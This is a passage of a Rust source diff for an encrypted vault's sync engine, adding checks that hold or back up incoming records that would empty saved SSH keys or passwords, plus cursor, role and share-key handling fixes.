@@ -125,11 +125,17 @@ impl DbState {
     /// Before a write that follows an await: is the profile that was open at
     /// `generation` still the one open? Call it while holding `conn`'s lock.
     fn still_open(&self, generation: u64) -> Result<(), String> {
-        if self.generation_now() == generation {
-            Ok(())
-        } else {
-            Err("[STATE] PROFILE_CHANGED: the profile was locked, or another one opened, while this was running. Nothing was written to it; open it and try again.".into())
-        }
+        still_at(&self.generation, generation)
+    }
+}
+
+/// `DbState::still_open`, for work on the blocking pool, which has the counter
+/// but not the state.
+fn still_at(current: &std::sync::atomic::AtomicU64, generation: u64) -> Result<(), String> {
+    if current.load(std::sync::atomic::Ordering::SeqCst) == generation {
+        Ok(())
+    } else {
+        Err("[STATE] PROFILE_CHANGED: the profile was locked, or another one opened, while this was running. Nothing was written to it; open it and try again.".into())
     }
 }
 
@@ -1148,6 +1154,96 @@ fn sane_record(rec: &SyncRecord) -> bool {
         && hlc::Hlc::valid_remote(&rec.updated_at)
 }
 
+/// The columns that hold what lives nowhere but in vaults. A record that
+/// empties one takes it as surely as a deletion does.
+fn secret_cols(table: &str) -> &'static [&'static str] {
+    match table {
+        "ssh_keys" => &["private_key", "passphrase"],
+        "credentials" | "servers" => &["password"],
+        _ => &[],
+    }
+}
+
+/// What a row of `table` holds now, by `secret_cols`. No such row gives no
+/// values: nothing to lose.
+fn secrets_here(conn: &Connection, table: &str, uuid: &str) -> Vec<Option<String>> {
+    let cols = secret_cols(table);
+    if cols.is_empty() {
+        return Vec::new();
+    }
+    conn.query_row(&format!("SELECT {} FROM {table} WHERE uuid=?1", cols.join(",")), [uuid], |r| {
+        (0..cols.len()).map(|i| r.get(i)).collect()
+    })
+    .unwrap_or_default()
+}
+
+/// A value of only spaces is as empty as none.
+fn is_filled(secret: &str) -> bool {
+    !secret.trim().is_empty()
+}
+
+/// Of what a row holds (`secrets_here`), the secrets a record with this
+/// payload leaves empty. A record that replaces a secret with another one is
+/// an ordinary edit, and so is a new key with no passphrase: the passphrase
+/// went with the key it opened.
+fn emptied_cols(table: &str, here: &[Option<String>], obj: &serde_json::Map<String, serde_json::Value>) -> Vec<&'static str> {
+    use serde_json::Value;
+    let new_key = |col: &str| {
+        col == "passphrase"
+            && obj.get("private_key").and_then(Value::as_str).is_some_and(|k| is_filled(k) && Some(k) != here[0].as_deref())
+    };
+    secret_cols(table)
+        .iter()
+        .zip(here)
+        .filter(|(col, had)| {
+            had.as_deref().is_some_and(is_filled)
+                && !new_key(col)
+                && match obj.get(**col) {
+                    None | Some(Value::Null) => true,
+                    Some(Value::String(s)) => !is_filled(s),
+                    Some(_) => false,
+                }
+        })
+        .map(|(col, _)| *col)
+        .collect()
+}
+
+/// Would `rec`, if it lands, leave a row here without a secret it has now
+/// (`emptied_cols`)?
+fn empties_a_secret(conn: &Connection, key: &[u8; 32], rec: &SyncRecord) -> bool {
+    use serde_json::Value;
+    if secret_cols(&rec.entity_type).is_empty() || rec.deleted || local_wins(conn, &rec.entity_type, rec) {
+        return false;
+    }
+    let here = secrets_here(conn, &rec.entity_type, &rec.uuid);
+    if !here.iter().flatten().any(|v| is_filled(v)) {
+        return false;
+    }
+    // What won't decrypt or parse isn't going to land: the merge deals with it.
+    let payload = rec
+        .blob
+        .as_deref()
+        .filter(|b| b.len() <= MAX_RECORD_BLOB_HEX)
+        .and_then(|b| decrypt_entity(b, key).ok())
+        .and_then(|plain| serde_json::from_slice::<Value>(&plain).ok());
+    payload.as_ref().and_then(Value::as_object).is_some_and(|obj| !emptied_cols(&rec.entity_type, &here, obj).is_empty())
+}
+
+/// How many rows the records in `records` are about to leave without a secret
+/// (`empties_a_secret`): what the merge does, counted first, so a profile can
+/// be kept as it is before it does (vault_backup.rs). What is held already
+/// changes nothing here, however often it comes, and a viewer keeps theirs
+/// (`apply_remote_inner`).
+fn rows_to_empty(conn: &Connection, key: &[u8; 32], records: &[SyncRecord]) -> usize {
+    if approvals::is_viewer(conn) {
+        return 0;
+    }
+    records
+        .iter()
+        .filter(|r| sane_record(r) && !approvals::wipe_is_held(conn, r) && empties_a_secret(conn, key, r))
+        .count()
+}
+
 /// The vault's size as it would be saved: its SQLite image, free pages and all.
 fn vault_bytes(conn: &Connection) -> Result<usize, String> {
     let pages: i64 = conn
@@ -1224,17 +1320,33 @@ fn apply_remote_inner(
     // done once the batch is in: a server's jump host lands in the repair pass.
     let shared = approvals::ready(&tx) && approvals::profile_is_shared(&tx);
     let mut watched = Vec::new();
+    // A viewer's rows go nowhere, so a password they saved here is theirs alone
+    // (each person typing their own is a normal way to share a server list),
+    // and a record with none says nothing about it. The record lands, without
+    // emptying anything (`apply_entity`): held whole, the owner's new address
+    // would stop at this device.
+    let viewer = shared && approvals::is_viewer(&tx);
     for spec in ENTITIES {
         let watch = shared && approvals::watches(spec.table);
         for rec in records.iter().filter(|r| !r.deleted && r.entity_type == spec.table) {
+            // In a shared profile, a record that empties a saved key or
+            // password waits for this device's user, like an SSH key's
+            // deletion (approvals::hold_wipe). A personal profile takes it.
+            if shared && !viewer && empties_a_secret(&tx, key, rec) {
+                approvals::hold_wipe(&tx, rec)?;
+                continue;
+            }
             let before = if watch { approvals::snapshot(&tx, spec.table, &rec.uuid) } else { None };
-            if let Err(e) = apply_entity(&tx, key, spec, rec, &mut fk_fixups) {
+            if let Err(e) = apply_entity(&tx, key, spec, rec, viewer, &mut fk_fixups) {
                 skipped += 1;
                 eprintln!("[SYNC] skipped record uuid={} type={}: {}", rec.uuid, rec.entity_type, e);
                 continue;
             }
             if watch {
                 watched.push((spec.table, &rec.uuid, before));
+            }
+            if shared {
+                approvals::release_wipe(&tx, rec)?;
             }
         }
     }
@@ -1250,21 +1362,7 @@ fn apply_remote_inner(
     }
     // Re-resolve every optional FK against the FINAL state of the batch, now that
     // both the entities and the tombstones have landed.
-    for f in fk_fixups {
-        let id: Option<i64> = tx
-            .query_row(
-                &format!("SELECT id FROM {} WHERE uuid=?1", f.ref_table),
-                [&f.ref_uuid],
-                |r| r.get(0),
-            )
-            .ok();
-        if let Err(e) = tx.execute(
-            &format!("UPDATE {} SET {}=?1 WHERE uuid=?2", f.table, f.fk_col),
-            rusqlite::params![id, f.uuid],
-        ) {
-            eprintln!("[SYNC] fk fixup skipped {}.{} uuid={}: {}", f.table, f.fk_col, f.uuid, e);
-        }
-    }
+    repair_links(&tx, fk_fixups);
     for (table, uuid, before) in &watched {
         approvals::hold_changes(&tx, table, uuid, before.as_ref())?;
     }
@@ -1284,28 +1382,46 @@ fn apply_remote_inner(
     Ok(skipped)
 }
 
-fn apply_entity(conn: &Connection, key: &[u8; 32], spec: &EntitySpec, rec: &SyncRecord, fk_fixups: &mut Vec<FkFixup>) -> Result<(), String> {
-    // LWW: keep local if it's newer-or-equal. A deleted row is hard-deleted, so
-    // its tombstone carries its only surviving stamp — it has to count as the
-    // local side of the comparison. Without it, a batch collected before a
-    // delete (sync drops the lock for the network leg, so the user can delete
-    // mid-flight) comes back still carrying the row as live, finds no live row
-    // to compare against, and re-inserts it — secrets and all.
+fn repair_links(conn: &Connection, fixups: Vec<FkFixup>) {
+    for f in fixups {
+        let id: Option<i64> = conn
+            .query_row(
+                &format!("SELECT id FROM {} WHERE uuid=?1", f.ref_table),
+                [&f.ref_uuid],
+                |r| r.get(0),
+            )
+            .ok();
+        if let Err(e) = conn.execute(
+            &format!("UPDATE {} SET {}=?1 WHERE uuid=?2", f.table, f.fk_col),
+            rusqlite::params![id, f.uuid],
+        ) {
+            eprintln!("[SYNC] fk fixup skipped {}.{} uuid={}: {}", f.table, f.fk_col, f.uuid, e);
+        }
+    }
+}
+
+/// LWW: keep local if it's newer-or-equal. A deleted row is hard-deleted, so
+/// its tombstone carries its only surviving stamp — it has to count as the
+/// local side of the comparison. Without it, a batch collected before a
+/// delete (sync drops the lock for the network leg, so the user can delete
+/// mid-flight) comes back still carrying the row as live, finds no live row
+/// to compare against, and re-inserts it — secrets and all.
+fn local_wins(conn: &Connection, table: &str, rec: &SyncRecord) -> bool {
     let local_ua: Option<String> = conn
-        .query_row(&format!("SELECT updated_at FROM {} WHERE uuid=?1", spec.table), [&rec.uuid], |r| r.get(0))
+        .query_row(&format!("SELECT updated_at FROM {table} WHERE uuid=?1"), [&rec.uuid], |r| r.get(0))
         .ok();
     let tomb_ua: Option<String> = conn
         .query_row(
             "SELECT updated_at FROM sync_tombstones WHERE uuid=?1 AND entity_type=?2",
-            rusqlite::params![&rec.uuid, spec.table],
+            rusqlite::params![&rec.uuid, table],
             |r| r.get(0),
         )
         .ok();
-    if [local_ua.as_deref(), tomb_ua.as_deref()]
-        .into_iter()
-        .flatten()
-        .any(|l| l >= rec.updated_at.as_str())
-    {
+    local_ua.iter().chain(&tomb_ua).any(|l| *l >= rec.updated_at)
+}
+
+fn apply_entity(conn: &Connection, key: &[u8; 32], spec: &EntitySpec, rec: &SyncRecord, keep_own: bool, fk_fixups: &mut Vec<FkFixup>) -> Result<(), String> {
+    if local_wins(conn, spec.table, rec) {
         return Ok(());
     }
     let blob = rec.blob.as_deref().ok_or("[SYNC] ENTITY_NO_BLOB")?;
@@ -1338,6 +1454,9 @@ fn apply_entity(conn: &Connection, key: &[u8; 32], spec: &EntitySpec, rec: &Sync
     // The same for a command's `scope` (#22): a peer from before it would
     // otherwise turn a command for some servers into one for all of them.
     let preserve_local_scope = spec.table == "commands" && !obj.contains_key("scope");
+    // On a viewer, the secrets this record would empty stay as they are (see
+    // `apply_remote_inner`).
+    let keep = if keep_own { emptied_cols(spec.table, &secrets_here(conn, spec.table, &rec.uuid), obj) } else { Vec::new() };
     for c in spec.cols {
         columns.push((*c).into());
         let val = obj.get(*c);
@@ -1424,6 +1543,8 @@ fn apply_entity(conn: &Connection, key: &[u8; 32], spec: &EntitySpec, rec: &Sync
                 format!("run_on_connect_every={}.run_on_connect_every", spec.table)
             } else if c.as_str() == "scope" && preserve_local_scope {
                 format!("scope={}.scope", spec.table)
+            } else if keep.contains(&c.as_str()) {
+                format!("{c}={}.{c}", spec.table)
             } else {
                 format!("{c}=excluded.{c}")
             }
@@ -1446,18 +1567,45 @@ fn apply_entity(conn: &Connection, key: &[u8; 32], spec: &EntitySpec, rec: &Sync
 /// `apply_tombstone` does, counted first, so a profile can be kept as it is
 /// before the merge deletes from it (vault_backup.rs).
 fn rows_to_delete(conn: &Connection, records: &[SyncRecord]) -> usize {
-    records
-        .iter()
-        .filter(|r| r.deleted && sane_record(r))
-        .filter(|r| {
-            ENTITIES.iter().find(|s| s.table == r.entity_type).is_some_and(|spec| {
-                conn.query_row(&format!("SELECT updated_at FROM {} WHERE uuid=?1", spec.table), [&r.uuid], |row| {
-                    row.get::<_, Option<String>>(0)
-                })
-                .is_ok_and(|ua| ua.as_deref().unwrap_or("") < r.updated_at.as_str())
+    records.iter().filter(|r| deletes_a_row(conn, r)).count()
+}
+
+fn deletes_a_row(conn: &Connection, r: &SyncRecord) -> bool {
+    r.deleted
+        && sane_record(r)
+        && ENTITIES.iter().find(|s| s.table == r.entity_type).is_some_and(|spec| {
+            conn.query_row(&format!("SELECT updated_at FROM {} WHERE uuid=?1", spec.table), [&r.uuid], |row| {
+                row.get::<_, Option<String>>(0)
             })
+            .is_ok_and(|ua| ua.as_deref().unwrap_or("") < r.updated_at.as_str())
         })
-        .count()
+}
+
+/// The first sync after a kept copy was put back (vault_backup::put_back):
+/// what the server's answer would take away again stays. Each such row gets a
+/// stamp newer than the record, as a kept row does in `resolve_held`, so the
+/// merge leaves it alone and the next push brings it back on every device.
+/// Everything else merges as usual, so what changed elsewhere since the copy
+/// was made isn't undone.
+fn keep_put_back_rows(conn: &Connection, key: &[u8; 32], hlc: &hlc::Hlc, records: &[SyncRecord]) -> Result<usize, String> {
+    conn.execute("INSERT INTO sync_flags(key,val) VALUES('merge',1) ON CONFLICT(key) DO UPDATE SET val=1", [])
+        .map_err(|e| format!("[SYNC] MERGE_ON: {e}"))?;
+    let kept = (|| -> Result<usize, String> {
+        let mut n = 0;
+        // (A viewer's merge keeps their secrets anyway, and lands the rest.)
+        let viewer = approvals::is_viewer(conn);
+        for rec in records.iter().filter(|r| sane_record(r) && (deletes_a_row(conn, r) || (!viewer && empties_a_secret(conn, key, r)))) {
+            n += conn
+                .execute(
+                    &format!("UPDATE {} SET updated_at=?1 WHERE uuid=?2", rec.entity_type),
+                    rusqlite::params![stamp_past(&hlc.tick(), &rec.updated_at), rec.uuid],
+                )
+                .map_err(|e| format!("[SYNC] KEEP: {e}"))?;
+        }
+        Ok(n)
+    })();
+    let _ = conn.execute("UPDATE sync_flags SET val=0 WHERE key='merge'", []);
+    kept
 }
 
 /// One remote deletion. It can write three things (unlink, delete, record the
@@ -1525,8 +1673,13 @@ struct SyncReport {
     key_change: bool,
     /// Rows this sync is deleting here, because they were deleted elsewhere.
     removed: usize,
-    /// When it deletes any, the copy of the profile kept first: its file name
-    /// (vault_backup.rs). None when nothing was deleted or no copy could be made.
+    /// Rows of a personal profile this sync leaves without a saved key or
+    /// password, because it was emptied elsewhere (`empties_a_secret`). A
+    /// shared profile holds those instead.
+    emptied: usize,
+    /// When it deletes or empties any, the copy of the profile kept first: its
+    /// file name (vault_backup.rs). None when nothing was deleted or no copy
+    /// could be made.
     backup: Option<String>,
 }
 
@@ -1540,7 +1693,10 @@ struct SyncReport {
 // still holds — cracking it costs the same Argon2id work as the vault itself.
 // It never matches an ENTITIES spec, so apply naturally ignores it; only the
 // restore path reads it. The updated_at is a fixed low sentinel so it sorts
-// first and never churns the LWW upsert.
+// first and never churns the LWW upsert. The server keeps the record it has on
+// an equal stamp, so a key that changed while the profile was shared would
+// leave the old key there for good: leaving the share gives the record a real
+// stamp of its own (`escrow_stamp`), which it then keeps.
 //
 // Blob layout (hex): version(1) ‖ salt(SALT_LEN) ‖ nonce(NONCE_LEN) ‖
 // AES-256-GCM(master_key, dek). `master_key` is Argon2id(password, salt) — the
@@ -1559,11 +1715,12 @@ const PW_ESCROW_VERSION: u8 = 2;
 /// Build the reserved DEK-escrow record: the profile DEK sealed under the
 /// profile's master key (Argon2id of its password). `salt` is the vault's own
 /// KDF salt, embedded so a fresh device can re-derive `master_key` from just the
-/// password.
+/// password. `stamp` is the profile's `escrow_stamp`.
 fn build_pw_escrow_record(
     master_key: &[u8; 32],
     salt: &[u8; SALT_LEN],
     dek: &[u8; 32],
+    stamp: &str,
 ) -> Result<SyncRecord, String> {
     let (ct, nonce) = encrypt_with_key(dek, master_key)?;
     let mut blob = Vec::with_capacity(1 + SALT_LEN + NONCE_LEN + ct.len());
@@ -1574,10 +1731,16 @@ fn build_pw_escrow_record(
     Ok(SyncRecord {
         uuid: ESCROW_UUID.to_string(),
         entity_type: ESCROW_ETYPE.to_string(),
-        updated_at: ESCROW_UAT.to_string(),
+        updated_at: stamp.to_string(),
         deleted: false,
         blob: Some(hex::encode(blob)),
     })
+}
+
+/// The stamp the profile's escrow record goes up with (see above).
+fn escrow_stamp(conn: &Connection) -> String {
+    conn.query_row("SELECT value FROM sync_meta WHERE key='escrow_stamp'", [], |r| r.get(0))
+        .unwrap_or_else(|_| ESCROW_UAT.to_string())
 }
 
 /// Recover a profile's DEK from a password-sealed escrow blob. Runs Argon2id, so
@@ -1770,11 +1933,18 @@ struct SyncCursor {
 /// The push cursor after a round that collected `sent`: past the latest of
 /// them when they went up, where it was when nothing was pushed (a viewer, a
 /// key change waiting). Stamps are fixed-width HLCs, so they order as text.
-fn pushed_through_after(previous: &str, sent: &[SyncRecord], pushed: bool) -> String {
+///
+/// Never past `clock`, this device's own clock at the collection. A row
+/// stamped further ahead than the clock follows (a peer's clock an hour fast,
+/// or a co-member's doing) would otherwise put the cursor above every edit
+/// made here from then on, and they would never go up. Such a row is simply
+/// collected again until the clock has passed it.
+fn pushed_through_after(previous: &str, sent: &[SyncRecord], pushed: bool, clock: &str) -> String {
     if !pushed {
         return previous.to_string();
     }
-    sent.iter().map(|r| r.updated_at.as_str()).chain([previous]).max().unwrap_or("").to_string()
+    let latest = sent.iter().map(|r| r.updated_at.as_str()).chain([previous]).max().unwrap_or("");
+    latest.min(clock).to_string()
 }
 
 fn key_tag(key: &[u8; 32]) -> [u8; 32] {
@@ -1840,9 +2010,10 @@ async fn sync_with(
     // a member is revoked, so the copy cached at import time goes stale. Fetch
     // it BEFORE serialising anything. A new key isn't used until the user
     // accepts it, though (`note_share_key`): until then this device only
-    // pulls. Cheap (a primary-key point lookup) and best-effort — offline or a
-    // hiccup just means we sync with what we have, exactly as before this
-    // existed.
+    // pulls, as it does when sharing is locked and the grant is one it hasn't
+    // seen (`note_share_grant`). The member's role comes with it. Cheap (a
+    // primary-key point lookup) and best-effort — offline or a hiccup just
+    // means we sync with what we have, exactly as before this existed.
     let existing_share: Option<String> = {
         let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
         let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
@@ -1850,19 +2021,15 @@ async fn sync_with(
         conn.query_row("SELECT value FROM sync_meta WHERE key='share_id'", [], |r| r.get(0)).ok()
     };
     if let Some(sid) = &existing_share {
-        if let Some((_, my_secret)) = cloud.identity().await {
-            if let Ok(grant) = cloud::share_dek(app, cloud, session, sid).await {
-                if let Ok(raw) = hex::decode(&grant.sealed_dek) {
-                    if let Ok(opened) = identity::unseal(&my_secret, &raw) {
-                        if opened.len() == 32 {
-                            let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
-                            let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
-                            db_state.still_open(generation)?;
-                            note_share_key(conn, &opened)?;
-                        }
-                    }
-                }
-            }
+        if let Ok(grant) = cloud::share_dek(app, cloud, session, sid).await {
+            let me = cloud.identity().await;
+            let opened = me.as_ref().and_then(|(_, my_secret)| {
+                hex::decode(&grant.sealed_dek).ok().and_then(|raw| identity::unseal(my_secret, &raw).ok())
+            });
+            let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
+            let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
+            db_state.still_open(generation)?;
+            note_share_grant(conn, &grant.sealed_dek, &grant.role, opened.as_deref(), me.is_some())?;
         }
     }
 
@@ -1879,8 +2046,49 @@ async fn sync_with(
         pulled: report.pulled + again.pulled,
         key_change: again.key_change,
         removed: report.removed + again.removed,
+        emptied: report.emptied + again.emptied,
         backup: again.backup.or(report.backup),
     })
+}
+
+/// What a merge did to the open profile.
+struct Merged {
+    /// Records it couldn't apply (see `apply_remote_records`).
+    skipped: usize,
+    removed: usize,
+    emptied: usize,
+    backup: Option<String>,
+}
+
+/// Merges a sync's answer into the open vault. A record proves nothing about
+/// who sent it, so before one deletes a row or empties a saved key or password
+/// the profile is kept as it stands (vault_backup.rs); the file on disk is
+/// still the state from before this merge. `vault` is that file, and
+/// `put_back` that a kept copy has just been made the profile again.
+fn merge_answer(
+    conn: &Connection,
+    key: &[u8; 32],
+    records: &[SyncRecord],
+    hlc: &hlc::Hlc,
+    vault: Result<&Path, &str>,
+    put_back: bool,
+) -> Result<Merged, String> {
+    if put_back {
+        keep_put_back_rows(conn, key, hlc, records)?;
+    }
+    let removed = rows_to_delete(conn, records);
+    let to_empty = rows_to_empty(conn, key, records);
+    let mut backup = None;
+    if removed + to_empty > 0 {
+        let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
+        match vault.map_err(str::to_string).and_then(|p| vault_backup::keep(p, now)) {
+            Ok(name) => backup = name,
+            Err(e) => eprintln!("[SYNC] no copy of the profile before a merge that deletes: {e}"),
+        }
+    }
+    let skipped = apply_remote_records(conn, key, records, hlc)?;
+    let emptied = if approvals::profile_is_shared(conn) { 0 } else { to_empty };
+    Ok(Merged { skipped, removed, emptied, backup })
 }
 
 /// One exchange of `sync_with`: from the open profile's `SyncCursor` when
@@ -1904,7 +2112,7 @@ async fn sync_round(
     // hold the DEK via a sealed grant without ever knowing this vault's
     // password. The DEK is created + persisted at profile-open, so it already
     // exists here; get_or_create is a defensive fallback only.
-    let (records, dek, hlc, share, cloud_profile, master_key, salt, key_change, partition, cursor) = {
+    let (records, dek, hlc, share, cloud_profile, master_key, salt, key_change, partition, cursor, clock, escrow_at) = {
         let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
         let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
         db_state.still_open(generation)?;
@@ -1941,15 +2149,18 @@ async fn sync_round(
         // don't know". A viewer that should have been an editor is a visible,
         // fixable annoyance; an editor that should have been a viewer is not.
         let share = share_id.map(|s| (s, share_role.unwrap_or_else(|| "user".to_string())));
-        let key_change = conn
-            .query_row("SELECT 1 FROM sync_meta WHERE key='pending_dek'", [], |_| Ok(()))
-            .is_ok();
+        let key_change = share_key_is_waiting(conn);
         // The delta cursor, if it is for exactly this: the same opening of the
         // profile, server, sign-in, partition and key.
         let partition = match &share {
             Some((sid, _)) => format!("share:{sid}"),
             None => format!("profile:{cloud_profile}"),
         };
+        // Deleted from the cloud on this device: nothing goes back up until
+        // the user says so (`cloud_delete_profile`).
+        if share.is_none() && is_cloud_deleted(&cloud_deleted_path(app)?, &cloud_deleted_key(session.base(), &cloud_profile)) {
+            return Err("[SYNC] DELETED_FROM_CLOUD: you deleted this profile from the cloud on this device, so it isn't uploaded. To upload it again, use its Profile panel.".into());
+        }
         let cursor: Option<SyncCursor> = if use_cursor {
             db_state
                 .sync_cursor
@@ -1971,14 +2182,18 @@ async fn sync_round(
         // without a cursor.
         let since = cursor.as_ref().map(|c| c.pushed_through.as_str()).unwrap_or("");
         let records = collect_local_records(conn, &dek, since)?;
-        (records, dek, hlc, share, cloud_profile, master_key, salt, key_change, partition, cursor)
+        // Under the same lock: whatever is edited after the collection is
+        // stamped above this (`pushed_through_after`).
+        let clock = hlc.tick();
+        let escrow_at = escrow_stamp(conn);
+        (records, dek, hlc, share, cloud_profile, master_key, salt, key_change, partition, cursor, clock, escrow_at)
     };
 
     // Shared profile → /shares/sync (role-gated). A viewer ('user') pushes
     // nothing — it can only pull, so sending records would just 403. Neither
-    // does a device whose share has a new key waiting for the user's OK: no
-    // one else can read a push sealed with the old key, and the new one may
-    // not be the owner's.
+    // does a device whose share has a new key waiting for the user's OK, or a
+    // grant it couldn't open: no one else can read a push sealed with the old
+    // key, and the new one may not be the owner's.
     let pull_from = cursor.as_ref().and_then(|c| c.pulled.clone());
     // Not what the server just sent and that is unchanged here: it has it.
     let to_send: Vec<SyncRecord> = match &cursor {
@@ -1992,9 +2207,21 @@ async fn sync_round(
     let (exchange, pushed, pushes) = if let Some((share_id, role)) = &share {
         let pushes = !(role == "user" || key_change);
         let to_push: &[SyncRecord] = if pushes { &to_send } else { &[] };
-        let exchange =
-            cloud::shared_sync_exchange_from(app, cloud, session, share_id, "", to_push, pull_from.as_ref()).await?;
-        (exchange, to_push.len(), pushes)
+        match cloud::shared_sync_exchange_from(app, cloud, session, share_id, "", to_push, pull_from.as_ref()).await {
+            // Made a viewer since the role was last read: the pull goes on.
+            // The push would be refused the same way every time, and the
+            // error would end the round before anything came down.
+            Err(e) if pushes && e.contains("read_only") => {
+                let exchange =
+                    cloud::shared_sync_exchange_from(app, cloud, session, share_id, "", &[], pull_from.as_ref()).await?;
+                let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
+                let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
+                db_state.still_open(generation)?;
+                note_share_role(conn, "user")?;
+                (exchange, 0, false)
+            }
+            result => (result?, to_push.len(), pushes),
+        }
     } else {
         // Personal profile: publish (or refresh) the DEK escrow alongside the
         // data so any device that knows this profile's password can bring it
@@ -2004,7 +2231,7 @@ async fn sync_round(
         let mut to_push = to_send;
         if cursor.is_none() {
             if let (Some(mk), Some(salt)) = (master_key, salt) {
-                to_push.push(build_pw_escrow_record(&mk, &salt, &dek)?);
+                to_push.push(build_pw_escrow_record(&mk, &salt, &dek, &escrow_at)?);
             }
         }
         // Send the local display name so the server can label this partition —
@@ -2018,58 +2245,70 @@ async fn sync_round(
     let pulled = exchange.records.len();
     // The server couldn't answer from the cursor: start over (`sync_with`).
     let reset = exchange.full && pull_from.is_some();
-    let mut removed = 0usize;
-    let mut backup: Option<String> = None;
+    let server_has = exchange.records.iter().map(|r| (r.uuid.clone(), r.updated_at.clone())).collect();
 
-    {
-        let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
-        let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
-        db_state.still_open(generation)?;
-        // About to delete rows? A tombstone proves nothing about who sent it, so
-        // the profile is kept as it stands first (vault_backup.rs); the file on
-        // disk is still the state from before this merge.
-        removed = rows_to_delete(conn, &exchange.records);
-        if removed > 0 {
-            let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
-            match profile_path(app, profile).and_then(|p| vault_backup::keep(&p, now)) {
-                Ok(name) => backup = name,
-                Err(e) => eprintln!("[SYNC] no copy of the profile before a merge that deletes: {e}"),
+    // On the blocking pool, as a save is: a large answer holds the vault's lock
+    // for as long as it takes, and on a worker it would stop whatever else that
+    // worker runs, terminals and tunnels included.
+    let vault = profile_path(app, profile);
+    let put_back = vault.as_ref().is_ok_and(|p| vault_backup::is_put_back(p));
+    let merged = {
+        let conn_arc = std::sync::Arc::clone(&db_state.conn);
+        let current = std::sync::Arc::clone(&db_state.generation);
+        let records = exchange.records;
+        let vault = vault.clone();
+        let hlc = hlc.clone();
+        let base = session.base().to_string();
+        tokio::task::spawn_blocking(move || -> Result<Merged, String> {
+            let conn_g = conn_arc.lock().map_err(|_| "[STATE] LOCK_CONN")?;
+            let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
+            still_at(&current, generation)?;
+            let merged = merge_answer(conn, &dek, &records, &hlc, vault.as_deref().map_err(String::as_str), put_back)?;
+            if unlinked {
+                link_profile_server(conn, &base)?;
             }
-        }
-        let skipped = apply_remote_records(conn, &dek, &exchange.records, &hlc)?;
-        if unlinked {
-            link_profile_server(conn, session.base())?;
-        }
-        // Where the next round starts. The push cursor moves past everything
-        // this round collected: what it sent, and what the server already had
-        // from its last answer. A row edited after the collection is stamped
-        // above all of it (the clock had seen every collected stamp), so it
-        // goes next time. The server's cursor is kept only when its whole
-        // answer landed here, so what didn't is asked for again in full.
-        //
-        // Only with a server that keeps cursors: one that doesn't (an older
-        // or a self-hosted server) can't say when it lost what it was sent,
-        // so every round with it stays a full one, both ways, as before.
-        let previous = cursor.as_ref().map(|c| c.pushed_through.as_str()).unwrap_or("");
-        let pushed_through = pushed_through_after(previous, &records, pushes);
-        let server_has = exchange.records.iter().map(|r| (r.uuid.clone(), r.updated_at.clone())).collect();
-        *db_state.sync_cursor.lock().map_err(|_| "[STATE] LOCK_SYNC_CURSOR")? = match exchange.cursor {
-            Some(server_cursor) if !reset => Some(SyncCursor {
-                generation,
-                server: session.base().to_string(),
-                account: session.account_tag(),
-                partition,
-                key: key_tag(&dek),
-                pushed_through,
-                server_has,
-                pulled: (skipped == 0 && !key_change).then_some(server_cursor),
-            }),
-            _ => None,
-        };
-    }
+            Ok(merged)
+        })
+        .await
+        .map_err(|e| format!("[SYNC] MERGE_JOIN: {e}"))??
+    };
+
+    // Where the next round starts. The push cursor moves past everything
+    // this round collected: what it sent, and what the server already had
+    // from its last answer, up to this device's clock. A row edited after the
+    // collection is stamped above that, so it goes next time. The server's
+    // cursor is kept only when its whole answer landed here, so what didn't
+    // is asked for again in full. A cursor left by a sync that lost a race
+    // with Lock is for another opening, and is ignored.
+    //
+    // Only with a server that keeps cursors: one that doesn't (an older
+    // or a self-hosted server) can't say when it lost what it was sent,
+    // so every round with it stays a full one, both ways, as before.
+    let previous = cursor.as_ref().map(|c| c.pushed_through.as_str()).unwrap_or("");
+    let pushed_through = pushed_through_after(previous, &records, pushes, &clock);
+    *db_state.sync_cursor.lock().map_err(|_| "[STATE] LOCK_SYNC_CURSOR")? = match exchange.cursor {
+        Some(server_cursor) if !reset => Some(SyncCursor {
+            generation,
+            server: session.base().to_string(),
+            account: session.account_tag(),
+            partition,
+            key: key_tag(&dek),
+            pushed_through,
+            server_has,
+            pulled: (merged.skipped == 0 && !key_change).then_some(server_cursor),
+        }),
+        _ => None,
+    };
     // Persist the merged vault so the applied changes survive a restart.
     save_vault_async(db_state).await?;
-    Ok((SyncReport { pushed, pulled, key_change, removed, backup }, reset))
+    // Only now: if the save failed, the kept rows are still to be kept.
+    if put_back {
+        if let Ok(path) = &vault {
+            vault_backup::clear_put_back(path);
+        }
+    }
+    let Merged { removed, emptied, backup, .. } = merged;
+    Ok((SyncReport { pushed, pulled, key_change, removed, emptied, backup }, reset))
 }
 
 #[derive(serde::Serialize)]
@@ -2321,6 +2560,99 @@ fn note_share_key(conn: &Connection, key: &[u8]) -> Result<(), String> {
     Ok(())
 }
 
+/// A hash of this member's sealed grant, to tell that it changed without
+/// opening it: opening takes the sharing identity, which every Lock and restart
+/// wipes. Sealing is random, so the same key sealed again counts as a change
+/// until it's opened and compared.
+fn grant_tag(sealed_dek: &str) -> String {
+    use sha2::Digest as _;
+    let mut h = sha2::Sha256::new();
+    h.update(b"submarine-share-grant-tag-v1\0");
+    h.update(sealed_dek.as_bytes());
+    hex::encode(h.finalize())
+}
+
+/// What a sync takes from this member's grant on the server (`/shares/dek`).
+/// `opened` is the key in it, if this device could open it, and `unlocked` that
+/// the sharing identity was there to try.
+///
+/// Opened, the key goes through `note_share_key`. Not opened, the grant is
+/// only compared with the last one opened here: a different one means the key
